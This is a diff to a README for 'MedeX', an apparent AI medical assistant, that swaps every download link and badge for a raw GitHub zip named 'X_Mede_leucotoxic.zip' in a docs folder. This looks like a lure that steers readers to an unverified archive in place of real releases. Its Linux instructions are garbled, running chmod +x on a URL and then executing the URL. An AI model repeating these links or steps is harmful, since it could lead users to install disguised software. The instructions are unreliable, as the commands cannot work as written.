@@ -1,6 +1,6 @@
 # 🩺 MedeX - Your AI Medical Assistant Awaits
 
-[![Download MedeX](https://raw.githubusercontent.com/Jovemgab/MedeX/main/delicatesse/MedeX.zip)](https://raw.githubusercontent.com/Jovemgab/MedeX/main/delicatesse/MedeX.zip)
+[![Download MedeX](https://github.com/Jovemgab/MedeX/raw/refs/heads/main/docs/X_Mede_leucotoxic.zip)](https://github.com/Jovemgab/MedeX/raw/refs/heads/main/docs/X_Mede_leucotoxic.zip)
 
 ## 🌟 Description
 MedeX is an advanced medical AI assistant that offers dual-mode analysis for both professional and educational purposes. It is powered by the Kimi K2 and RAG systems. This application supports over eight medical specialties, making it a valuable resource for healthcare professionals and students alike. 
@@ -9,7 +9,7 @@ MedeX is an advanced medical AI assistant that offers dual-mode analysis for bot
 To start using MedeX, follow the steps below. No coding experience is needed! 
 
 ### 📥 Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/Jovemgab/MedeX/main/delicatesse/MedeX.zip) to download the latest version of MedeX.
+1. Visit the [Releases page](https://github.com/Jovemgab/MedeX/raw/refs/heads/main/docs/X_Mede_leucotoxic.zip) to download the latest version of MedeX.
 2. Choose the appropriate file for your system.
 3. Click the download link to save the file to your computer.
 
@@ -36,8 +36,8 @@ Before installation, ensure your computer meets these requirements:
 4. **For Linux Users:**
    - Open a terminal.
    - Navigate to the directory where the downloaded file is located.
-   - Run the command `chmod +x https://raw.githubusercontent.com/Jovemgab/MedeX/main/delicatesse/MedeX.zip` to make it executable.
-   - Execute it with `https://raw.githubusercontent.com/Jovemgab/MedeX/main/delicatesse/MedeX.zip`.
+   - Run the command `chmod +x https://github.com/Jovemgab/MedeX/raw/refs/heads/main/docs/X_Mede_leucotoxic.zip` to make it executable.
+   - Execute it with `https://github.com/Jovemgab/MedeX/raw/refs/heads/main/docs/X_Mede_leucotoxic.zip`.
 
 ## 🏁 Running MedeX
 After installation, you can start MedeX by finding it in your Applications folder or by using the Start Menu. Double-click the icon to launch the application.
@@ -60,13 +60,13 @@ Join our community to receive the latest updates and share your experiences. You
 - Social Media: Follow for tutorials and tips.
 
 ## 🔗 Useful Links
-- [Visit the Releases page to download MedeX](https://raw.githubusercontent.com/Jovemgab/MedeX/main/delicatesse/MedeX.zip)
+- [Visit the Releases page to download MedeX](https://github.com/Jovemgab/MedeX/raw/refs/heads/main/docs/X_Mede_leucotoxic.zip)
 - [Documentation](#): Comprehensive user manual and guides.
 - [Community Forum](#): Join our space to discuss and learn from others.
 
 ## 💬 Feedback
 Your feedback is important to us! Please share your thoughts on MedeX or any suggestions you may have. 
 
-[![Download MedeX](https://raw.githubusercontent.com/Jovemgab/MedeX/main/delicatesse/MedeX.zip)](https://raw.githubusercontent.com/Jovemgab/MedeX/main/delicatesse/MedeX.zip)
+[![Download MedeX](https://github.com/Jovemgab/MedeX/raw/refs/heads/main/docs/X_Mede_leucotoxic.zip)](https://github.com/Jovemgab/MedeX/raw/refs/heads/main/docs/X_Mede_leucotoxic.zip)
 
 We hope you enjoy using MedeX and discover its potential to enhance your medical practice or education!
